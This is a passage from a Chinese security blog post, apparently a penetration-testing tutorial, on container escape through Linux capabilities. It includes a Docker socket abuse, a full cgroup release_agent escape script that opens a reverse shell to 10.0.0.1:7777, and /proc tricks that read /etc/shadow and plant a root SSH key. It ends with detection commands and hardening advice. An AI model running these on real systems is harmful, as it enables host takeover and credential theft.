class="string">EOF</span></span><br><span class="line">curl -X POST --unix-socket /var/run/docker.sock \</span><br><span class="line">    -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d @container.json \</span><br><span class="line">    http://localhost/containers/create</span><br><span class="line"><span class="comment"># 替换 CONTAINER_ID 后启动</span></span><br><span class="line">curl -X POST --unix-socket /var/run/docker.sock \</span><br><span class="line">    http://localhost/containers/CONTAINER_ID/start</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-cgroup-release-agent-逃逸"><a href="#4-3-cgroup-release-agent-逃逸" class="headerlink" title="4.3 cgroup release_agent 逃逸"></a>4.3 cgroup release_agent 逃逸</h3><p>最经典的容器逃逸方式之一，利用 cgroup v1 <code>release_agent</code> 机制在宿主机以 root 执行命令。前置条件：容器拥有 CAP_SYS_ADMIN 且 cgroup 可写。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># === 完整逃逸脚本 ===</span></span><br><span class="line">PAYLOAD=<span class="string">&#x27;#!/bin/sh</span></span><br><span class="line"><span class="string">bash -i &gt;&amp; /dev/tcp/10.0.0.1/7777 0&gt;&amp;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载 cgroup</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/cgrp/x</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 OverlayFS upperdir（容器文件系统在宿主机的实际路径）</span></span><br><span class="line">host_path=$(sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] Host path: <span class="variable">$host_path</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 payload</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$PAYLOAD</span>&quot;</span> &gt; /tmp/payload.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/payload.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/tmp/payload.sh&quot;</span> &gt; /tmp/cgrp/release_agent</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发：进程退出 → cgroup 释放 → release_agent 以宿主机 root 执行</span></span><br><span class="line">sh -c <span class="string">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Payload triggered.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击流程图：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">容器内 ① mount cgroup → ② notify_on_release=1</span><br><span class="line">       → ③ 获取 upperdir 路径（宿主机视角）</span><br><span class="line">       → ④ 写 /tmp/payload.sh</span><br><span class="line">       → ⑤ release_agent=&lt;host_path&gt;/tmp/payload.sh</span><br><span class="line">       → ⑥ 进程退出 → 宿主机 root 执行 payload → 反弹 shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-4-proc-文件系统挂载逃逸"><a href="#4-4-proc-文件系统挂载逃逸" class="headerlink" title="4.4 &#x2F;proc 文件系统挂载逃逸"></a>4.4 &#x2F;proc 文件系统挂载逃逸</h3><p>当容器以 <code>--pid=host</code> 或挂载宿主机 <code>/proc</code> 时：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 手法一：nsenter 加入宿主机全部命名空间（需要 --pid=host）</span></span><br><span class="line">nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手法二：通过 /proc/1/root 访问宿主机根文件系统</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/root/etc/shadow</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAA...&quot;</span> &gt; /proc/1/root/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手法三：修改宿主机内核参数</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward    <span class="comment"># 开启 IP 转发实现 MitM</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="五、检测与防御"><a href="#五、检测与防御" class="headerlink" title="五、检测与防御"></a>五、检测与防御</h2><h3 id="检测命令"><a href="#检测命令" class="headerlink" title="检测命令"></a>检测命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">capsh --<span class="built_in">print</span>                        <span class="comment"># 查看当前 Capabilities</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/status | grep Cap        <span class="comment"># 检查权限位</span></span><br><span class="line">mount | grep -E <span class="string">&#x27;docker.sock|/proc|/dev/sd&#x27;</span>  <span class="comment"># 敏感挂载</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/status | grep Seccomp    <span class="comment"># 0=disabled, 2=filter</span></span><br><span class="line">aa-status 2&gt;/dev/null                <span class="comment"># AppArmor 状态</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h3><table>
+<thead>
+<tr>
+<th>层面</th>
+<th>措施</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Capabilities</td>
+<td>遵循最小权限，避免 <code>--cap-add=ALL</code></td>
+</tr>
+<tr>
+<td>Privileged</td>
+<td>禁止 <code>--privileged</code>，按需添加具体能力</td>
+</tr>
+<tr>
+<td>docker.sock</td>
+<td>严禁将 Docker socket 挂载到容器</td>
+</tr>
+<tr>
+<td>只读根文件系统</td>
+<td><code>--read-only</code> 阻止写入恶意脚本</td>
+</tr>
+<tr>
+<td>AppArmor &#x2F; SELinux</td>
+<td>启用强制访问控制</td>
+</tr>
+<tr>
+<td>seccomp</td>
+<td>自定义 profile，阻断危险系统调用</td>
+</tr>
+<tr>
+<td>User Namespace</td>
+<td><code>--userns-remap</code> 将容器 root 映射到宿主机非特权用户</td>
+</tr>
+<tr>
+<td>no-new-privileges</td>
+<td><code>--security-opt=no-new-privileges</code> 阻止子进程获取新能力</td>
+</tr>
+</tbody></table>
+<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>Linux Capabilities 虽将 root 拆分，<code>cap_sys_admin</code>、<code>cap_sys_ptrace</code> 等依然具备近乎 root 的危险性。文件 Capabilities 的错误配置是本地提权的常见入口。在容器场景中，逃逸往往由三个要素促成：<strong>过多的 Capabilities + 共享的宿主机资源 + 缺乏强制访问控制</strong>。理解这些攻击手法是构建纵深防御的前提。</p>
+<p>更多技术参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>、<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/">HackTricks</a>。</p>
+<p><em>本文更新于 2024 年 10 月，部分利用手法可能随内核版本和容器运行时更新而失效。</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag"># 权限提升</a>
+              <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" rel="tag"># 云安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/SQL-injection-stacked-queries/" rel="prev" title="SQL 注入：堆叠查询注入">
+                  <i class="fa fa-angle-left"></i> SQL 注入：堆叠查询注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/pentestools/" rel="next" title="渗透工具常用命令速查（个人笔记）">
+                  渗透工具常用命令速查（个人笔记） <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
